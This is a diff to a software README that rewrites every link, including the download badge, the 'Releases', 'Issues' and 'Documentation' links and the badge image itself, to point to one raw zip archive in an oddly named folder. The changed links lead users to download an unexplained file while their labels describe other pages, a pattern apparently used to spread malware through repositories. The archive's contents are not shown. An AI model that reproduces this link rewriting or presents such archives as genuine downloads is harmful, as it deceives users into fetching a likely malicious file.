@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the software from our reposit
 
 ## 📥 Download Now
 
-[![Download Prediction-Fails-When-Systems-Move](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nanadada0731/Prediction-Fails-When-Systems-Move/releases)
+[![Download Prediction-Fails-When-Systems-Move](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip)](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip)
 
 ## 🌟 Overview
 
@@ -58,7 +58,7 @@ To ensure smooth operation, make sure your system meets the following minimum re
 
 To download the software, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Nanadada0731/Prediction-Fails-When-Systems-Move/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip).
 2. Find the latest version available.
 3. Click on the asset you wish to download.
 4. Follow the on-screen instructions to complete the download.
@@ -86,19 +86,19 @@ If you encounter any issues during installation or use, here are some tips:
 
 - Ensure your system meets the requirements.
 - Check for any firewall or antivirus software that may block the installation.
-- Visit our [Issues page](https://github.com/Nanadada0731/Prediction-Fails-When-Systems-Move/issues) to see if others have reported similar problems.
+- Visit our [Issues page](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip) to see if others have reported similar problems.
 - Feel free to create a new issue for further assistance.
 
 ## 🔗 Links
 
 For additional information or support, visit:
 
-- [Releases Page](https://github.com/Nanadada0731/Prediction-Fails-When-Systems-Move/releases)
-- [Issues Page](https://github.com/Nanadada0731/Prediction-Fails-When-Systems-Move/issues)
-- [Documentation](https://github.com/Nanadada0731/Prediction-Fails-When-Systems-Move/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip)
+- [Issues Page](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip)
 
 ## 📥 Final Reminder
 
 Click the button below to start your journey with "Prediction-Fails-When-Systems-Move".
 
-[![Download Prediction-Fails-When-Systems-Move](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nanadada0731/Prediction-Fails-When-Systems-Move/releases)
+[![Download Prediction-Fails-When-Systems-Move](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip)](https://raw.githubusercontent.com/Nanadada0731/Prediction-Fails-When-Systems-Move/main/oxyuriasis/When-Systems-Prediction-Fails-Move-v2.4.zip)
